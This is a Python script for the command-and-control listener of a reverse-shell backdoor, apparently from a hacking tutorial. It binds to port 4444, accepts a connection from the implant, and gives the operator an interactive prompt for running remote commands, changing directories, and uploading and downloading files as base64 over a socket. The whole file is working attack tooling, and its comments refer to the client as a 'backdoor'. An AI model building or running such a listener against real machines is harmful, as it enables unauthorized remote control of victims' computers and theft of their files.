#!/usr/bin/env python

import socket, json, base64

class Listener:
	def __init__(self, ip, port): # Constructor
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket object
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # configures socket to be reusable
		listener.bind((ip, port)) # bind to ip of LOCAL machine (for listening)
		listener.listen(0) # number of connection to queue before start getting refused
		print("[+] Waiting for incoming connections ... ")
		self.connection, address = listener.accept() # accept connection. Returns socket object and address bound to it
		print("[+] Got a connection from " + str(address))

	def reliable_send(self, data): # Encodes the sending message into JSON for serialization
		json_data = json.dumps(data) # encodes
		self.connection.send(json_data.encode()) # sends via encoded message through socket
		# encode() for byte-type encode for p3 compatibility
	
	def reliable_recv(self): # Decodes the receiving message from JSON to plain text
		json_data = b"" # byte type object -string- (P3 comp)
		while True:
			try: # if the data is higher that buffer size, iterates
				json_data = json_data + self.connection.recv(1024) # recieves encoded message
				return json.loads(json_data) # decode message
			except ValueError:
				continue
			
	def execute_remotely(self, command): # Sends and process the command
		self.reliable_send(command) # sends command
		
		if command[0] == "stop":
			self.connection.close() # close socket
			exit() # stops program
			
		return self.reliable_recv() # wait for answer from backdoor
	
	def write_file(self, path, content): # Method to write binary content into a file
		with open(path, "wb") as file: # write binary
			file.write(base64.b64decode(content)) # decode from Base64
			return "[+] Download successful."
	
	def read_file(self, path): # Method to read file content 
		with open(path, "rb") as file: # open and read binary
			return base64.b64encode(file.read()) # encodes file content in Base64	
	
	def run(self):
		while True: 
			command = input(">> ") # user prompt
			command = command.split(" ") # split input based on spaces
			
			try:
				if command[0] == 'upload': # upload a file to client PC
					file_content = self.read_file(command[1]) # second element of list is filename
					command.append(file_content.decode()) # third element of list is the content
				elif command[0] == "cd" and len(command) > 2:
					command[1] = " ".join(command[1:])
				result = self.execute_remotely(command)
				
				if command[0] == 'download' and "[-] Error " not in result: # download command
					result = self.write_file(command[1], result)
			
			except Exception:
				result = "[-] Error during command execution."
				
			print(result)

my_listener = Listener("192.168.0.199", 4444) # ip for binding the listener to local machine
print("[+] Type 'stop' to stop connection and quit programs.")
my_listener.run()
